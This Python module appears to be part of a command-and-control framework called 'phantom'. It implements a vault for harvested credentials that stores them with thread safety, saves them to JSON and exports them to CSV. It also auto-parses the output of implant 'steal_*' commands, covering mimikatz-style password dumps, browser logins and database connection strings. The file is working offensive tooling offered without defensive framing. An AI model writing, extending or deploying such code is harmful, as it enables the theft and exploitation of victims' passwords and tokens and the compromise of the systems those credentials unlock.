"""Credential vault -- stores harvested credentials in memory and on disk."""

import csv
import io
import json
import logging
import re
import threading
import time
import uuid

log = logging.getLogger("phantom.c2.creds")


class CredentialStore:
    """Thread-safe credential storage with JSON persistence."""

    def __init__(self, path: str | None = None):
        self._creds: dict[str, dict] = {}
        self._lock = threading.Lock()
        self._path = path
        if path:
            self.load_from_file(path)

    def add(self, source: str, cred_type: str, username: str,
            password: str, host: str = "", database: str = "") -> str:
        """Store a credential and return its ID."""
        cred_id = f"cred-{uuid.uuid4().hex[:8]}"
        entry = {
            "id": cred_id,
            "source": source,
            "type": cred_type,
            "username": username,
            "password": password,
            "host": host,
            "database": database,
            "timestamp": time.time(),
        }
        with self._lock:
            self._creds[cred_id] = entry
        log.info(f"[+] Credential stored: {cred_type} {username}@{host} (from {source})")
        self._auto_save()
        return cred_id

    def list_all(self) -> list[dict]:
        """Return every stored credential."""
        with self._lock:
            return list(self._creds.values())

    def get(self, cred_id: str) -> dict | None:
        with self._lock:
            return self._creds.get(cred_id)

    def search(self, query: str) -> list[dict]:
        """Search across all credential fields."""
        q = query.lower()
        with self._lock:
            return [
                c for c in self._creds.values()
                if any(q in str(v).lower() for v in c.values())
            ]

    def delete(self, cred_id: str) -> bool:
        with self._lock:
            if cred_id in self._creds:
                del self._creds[cred_id]
                self._auto_save()
                return True
            return False

    @property
    def count(self) -> int:
        with self._lock:
            return len(self._creds)

    # ---- export / persistence ----

    def export_csv(self) -> str:
        """Export all credentials as a CSV string."""
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["id", "source", "type", "username", "password",
                         "host", "database", "timestamp"])
        with self._lock:
            for c in self._creds.values():
                writer.writerow([
                    c["id"], c["source"], c["type"], c["username"],
                    c["password"], c["host"], c["database"],
                    time.strftime("%Y-%m-%d %H:%M:%S",
                                 time.localtime(c["timestamp"])),
                ])
        return buf.getvalue()

    def save_to_file(self, path: str | None = None):
        dest = path or self._path
        if not dest:
            return
        with self._lock:
            data = list(self._creds.values())
        with open(dest, "w") as fh:
            json.dump(data, fh, indent=2)

    def load_from_file(self, path: str | None = None):
        src = path or self._path
        if not src:
            return
        try:
            with open(src) as fh:
                data = json.load(fh)
            with self._lock:
                for entry in data:
                    cred_id = entry.get("id", f"cred-{uuid.uuid4().hex[:8]}")
                    entry["id"] = cred_id
                    self._creds[cred_id] = entry
            log.info(f"[*] Loaded {len(data)} credentials from {src}")
        except FileNotFoundError:
            pass
        except (json.JSONDecodeError, KeyError) as exc:
            log.warning(f"[-] Failed to load credentials: {exc}")

    def _auto_save(self):
        if self._path:
            self.save_to_file(self._path)

    # ---- auto-parse from agent output ----

    # Patterns for extracting credentials from steal_* command output
    _PATTERNS = [
        # steal_creds / mimikatz style: "Username: x  Password: y  Domain: z"
        re.compile(
            r"Username\s*[:=]\s*(?P<user>\S+)\s+"
            r"(?:Domain\s*[:=]\s*(?P<domain>\S+)\s+)?"
            r"Password\s*[:=]\s*(?P<pass>\S+)",
            re.IGNORECASE,
        ),
        # steal_browser / generic "user:pass@host"
        re.compile(
            r"(?P<user>[^:]+):(?P<pass>[^@]+)@(?P<host>\S+)",
        ),
        # steal_db / connection string: "Server=x;Database=y;User Id=u;Password=p"
        re.compile(
            r"Server\s*=\s*(?P<host>[^;]+);\s*Database\s*=\s*(?P<db>[^;]+);\s*"
            r"User\s*Id\s*=\s*(?P<user>[^;]+);\s*Password\s*=\s*(?P<pass>[^;]+)",
            re.IGNORECASE,
        ),
    ]

    def parse_response(self, session_id: str, payload: dict) -> list[str]:
        """Auto-parse credential data from task response output.

        Returns list of newly created credential IDs.
        """
        command = payload.get("command", "")
        output = payload.get("output", "")
        if not output or not command.startswith("steal_"):
            return []

        new_ids: list[str] = []
        source = f"{session_id}/{command}"

        for pattern in self._PATTERNS:
            for match in pattern.finditer(output):
                groups = match.groupdict()
                username = groups.get("user", "")
                password = groups.get("pass", "")
                host = groups.get("host", "")
                database = groups.get("db", "")
                if username and password:
                    cred_type = "password"
                    if "browser" in command:
                        cred_type = "browser"
                    elif "db" in command:
                        cred_type = "database"
                    elif "token" in command:
                        cred_type = "token"
                    cid = self.add(source, cred_type, username, password,
                                   host, database)
                    new_ids.append(cid)

        return new_ids
